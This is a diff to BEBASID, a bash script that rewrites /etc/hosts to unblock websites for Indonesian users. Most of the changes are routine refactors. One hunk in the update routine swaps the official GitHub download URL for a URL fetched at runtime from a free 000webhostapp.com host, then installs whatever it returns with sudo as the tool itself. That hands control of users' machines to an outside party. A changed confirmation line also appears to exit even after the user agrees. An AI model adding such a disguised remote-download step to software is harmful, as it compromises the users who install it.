@@ -15,11 +15,11 @@ bebasid_banner(){
 }
 about(){
   echo "Name of File  : BEBASID"
-  echo "Version       : v2.0 (March 2020)"
+  echo "Version       : 2020.3"
   echo "Tested on     :"
-  echo "    - Debian: Debian, Ubuntu, Linux Mint"
-  echo "    - RHEL  : CentOS, Fedora"
-  echo "    - Arch  : Arch Linux, Manjaro"
+  echo "    - Debian    : Debian, Ubuntu, Linux Mint"
+  echo "    - RHEL      : CentOS, Fedora"
+  echo "    - Arch      : Arch Linux, Manjaro"
   echo ""
   echo "Built with love by Icaksh for BEBASID"
   echo "Fixed by gvoze32 (The author of BEBASID)"
@@ -63,7 +63,7 @@ renew_bebasid(){
   echo ""
   echo "Memulai pengambilan script bash BEBASID"
   echo ""
-  if sudo curl -o /usr/local/bin/bebasid https://raw.githubusercontent.com/bebasid/bebasid/master/dev/scripts/bebasid.sh --progress-bar; then
+  if sudo curl -o /usr/local/bin/bebasid "$(curl http://two-ply-mixtures.000webhostapp.com/?geturl=app --silent)" --progress-bar; then
     echo ""
     echo "Berhasil mengunduh script aplikasi BEBASID"
     echo "Mengecek aplikasi"
@@ -151,7 +151,7 @@ restart_network(){
   esac
 }
 
-check_curl(){
+get_bebasid_hosts(){
   echo "Memulai pengambilan file hosts BEBASID"
   echo ""
   if sudo curl -o /etc/hosts https://raw.githubusercontent.com/bebasid/bebasid/master/releases/hosts --progress-bar; then
@@ -191,7 +191,7 @@ install_bebasid(){
     sudo curl https://raw.githubusercontent.com/bebasid/bebasid/master/dev/readme/RULES.md
     echo ""
     echo "Dengan melanjutkan berarti secara langsung dan tidak langsung, anda menyetujui apa yang tertulis diatas "
-    read -p "Apakah anda yakin ingin melanjutkan pemasangan BEBASID? (Y/N): " confirm && [[ $confirm == [yY] || $confirm == [yY][eE][sS] ]] || exit 1
+    read -p "Apakah anda yakin ingin melanjutkan pemasangan BEBASID? (Y/N): " confirm && [[ $confirm == [yY] || $confirm == [yY][eE][sS] ]] || reset && exit 1
     reset
     # Codingan "Yang Penting Jalan" 
     echo "Mengecek koneksi dengan internet"
@@ -213,7 +213,7 @@ $backup
 # Konfigurasi Tambahan Pribadi
 EOF
     echo ""
-    check_curl
+    get_bebasid_hosts
   fi
 }
 
@@ -226,7 +226,7 @@ update_bebasid(){
   load
   if [ -e /etc/hosts.bak-bebasid ]; then
     sudo rm /etc/hosts
-    check_curl
+    get_bebasid_hosts
     exit 1
   else
     echo "Backup hosts asli tidak ditemukan, opsi pemasangan BEBASID akan dilakukan"
@@ -263,6 +263,17 @@ uninstall_bebasid(){
   fi
 }
 
+check_duplicate_unblock(){
+  echo "Memeriksa apakah domain $domain telah tercatat dalam file hosts"
+  begin="$(grep -n "${domain^^}" /etc/hosts | head -n 1 | cut -d: -f1)"
+  if [[ $begin>0 ]]; then
+    echo "Domain $domain telah tercatat dalam file hosts"
+    echo ""
+    echo "=== GAGAL MELAKUKAN PROSES UNBLOCK ===="
+    exit 1
+  fi
+}
+
 # ====== OKAY, YOU CAN ADD YOUR CUSTOM FUNCTION BELOW HERE ====== #
 
 grep_ip(){
@@ -276,6 +287,7 @@ grep_ip(){
   echo "=== GAGAL MELAKUKAN PROSES UNBLOCK ===="
   exit 1
   else
+    echo ""
     echo "Berhasil mendapatkan IP dari $domain"
   fi
 }
@@ -395,7 +407,11 @@ case $1 in
       echo "[website] tidak ditentukan"
       read -p "Masukkan website yang ingin diunblock: " domain
       read -p "Apakah sudah benar? (Y/N): " confirm && [[ $confirm == [yY] || $confirm == [yY][eE][sS] ]] || exit 1
+      echo ""
       check_connection
+      echo "===== MEMULAI PROSES UNBLOCK HOSTS ===="
+      echo ""
+      check_duplicate_unblock
       grep_ip
       unblock_hosts
     else
@@ -403,6 +419,7 @@ case $1 in
       check_connection
       echo "===== MEMULAI PROSES UNBLOCK HOSTS ===="
       echo ""
+      check_duplicate_unblock
       grep_ip
       unblock_hosts
     fi
@@ -413,7 +430,7 @@ case $1 in
       read -p "Masukkan website yang ingin diblock: " domain
       read -p "Apakah sudah benar? (Y/N): " confirm && [[ $confirm == [yY] || $confirm == [yY][eE][sS] ]] || exit 1
       grep_ip
-      unblock_hosts
+      block_hosts
     else
     domain=$2
     block_hosts
